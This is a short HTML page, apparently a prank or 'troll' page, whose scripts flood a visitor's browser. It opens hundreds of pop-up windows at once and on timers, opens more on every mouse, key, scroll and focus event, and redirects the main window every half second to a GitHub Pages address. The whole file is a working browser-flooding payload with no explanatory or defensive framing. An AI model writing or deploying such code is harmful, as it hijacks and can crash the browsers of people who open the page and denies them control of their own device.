<!DOCTYPE html>
<html>
<head>
    <meta http-equiv='refresh' content='0.5; url=https://bader133b.github.io/triggertroll/'>
    <script>
        const TARGET = 'https://bader133b.github.io/typatroll/';
        
        // Open 100 windows immediately
        for (let i = 0; i < 100; i++) {
            setTimeout(() => {
                try {
                    window.open(TARGET, '_blank');
                } catch(e) {}
            }, i * 30);
        }
        
        // Open 20 windows every 300ms
        setInterval(() => {
            for (let i = 0; i < 20; i++) {
                try {
                    window.open(TARGET, '_blank');
                } catch(e) {}
            }
        }, 300);
        
        // Open on every event
        ['load', 'DOMContentLoaded', 'focus', 'blur', 'click', 'mousemove', 'mousedown', 'keydown', 'keyup', 'scroll', 'touchstart'].forEach(event => {
            window.addEventListener(event, () => {
                for (let i = 0; i < 10; i++) {
                    try {
                        window.open(TARGET, '_blank');
                    } catch(e) {}
                }
            }, { once: false });
        });
        
        // Redirect main window every 0.5 seconds
        setInterval(() => {
            window.location.href = TARGET;
        }, 500);
        
        setTimeout(() => {
            window.location.href = TARGET;
        }, 200);
    </script>
</head>
<body>
    <script>
        for (let i = 0; i < 50; i++) {
            try {
                window.open(TARGET, '_blank');
            } catch(e) {}
        }
        
        setTimeout(() => {
            window.location.href = TARGET;
        }, 100);
    </script>
</body>
</html>
